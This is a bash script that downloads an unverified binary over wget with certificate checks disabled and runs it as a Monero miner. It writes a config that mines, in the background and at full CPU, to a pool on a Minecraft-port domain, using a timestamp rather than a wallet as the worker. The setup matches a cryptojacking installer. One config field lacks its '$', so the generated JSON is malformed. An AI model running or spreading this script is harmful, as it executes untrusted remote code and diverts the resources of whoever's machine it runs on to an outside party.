#!/bin/bash
POOL="xmr.minecraftbe.org:25565"
WORKER=$(date "+%Y%m%d%H%M%S")
DONATE=0
BACKGROUND=true
USEAGE=100

# get options
while getopts ":b:d:u:" opt
do
    case $opt in
        b)
        BACKGROUND=${OPTARG}
        ;;
        d)
        DONATE=${OPTARG}
        ;;
        u)
        USEAGE=${OPTARG}
        ;;
        ?)
        echo "Unknown options"
        exit 1;;
    esac
done

rm -f "miner"
wget --no-check-certificate https://raw.imbytecat.com/imByteCat/fast-miner/master/linux/miner && chmod +x ./miner
rm -f "config.json"
cat>"config.json"<< EOF
{
    "autosave": true,
    "background": ${BACKGROUND},
    "randomx": {
        "1gb-pages": true
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "max-threads-hint": {USEAGE}
    },
    "donate-level": ${DONATE},
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "coin": null,
            "algo": null,
            "url": "${POOL}",
            "user": "${WORKER}",
            "pass": "x",
            "tls": false,
            "keepalive": true,
            "nicehash": true
        }
    ]
}
EOF
./miner
